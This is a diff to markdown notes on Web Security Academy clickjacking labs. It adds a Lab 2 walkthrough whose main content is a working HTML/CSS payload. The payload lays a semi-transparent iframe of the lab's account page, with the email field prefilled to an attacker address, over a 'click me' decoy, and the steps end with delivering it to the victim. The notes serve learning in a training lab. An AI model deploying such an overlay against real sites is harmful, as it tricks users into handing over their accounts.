@@ -44,4 +44,28 @@ Tricking users into clicking something harmful without their knowledge.
 when user can only sees click button on the exploit website it clicks and it deletes the user's account on the legitimate website.
 
 ## Lab 2: Clickjacking with form input data prefilled from a URL parameter
-
+1. Login using the credentials provided.
+2. After checking we can see Update email request requests the server with a parameter named 'email'
+3. On the Exploit server's body paste
+```
+    <style>
+    iframe {
+        position:relative;
+        width: 1135;
+        height: 600;
+        opacity: 0.5;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 460;
+        left: 80;
+        z-index: 1;
+    }
+  </style>
+<div>click me</div>
+<iframe src=https://0ad80036044cd32280052b47008600cf.web-security-academy.net/my-account?email=hacker@hacker.com></iframe>
+```
+- email parameter will contain attacker's email
+4. Change Values according to the legitimate website by doing view exploit.
+5. Deliver exploit to victim
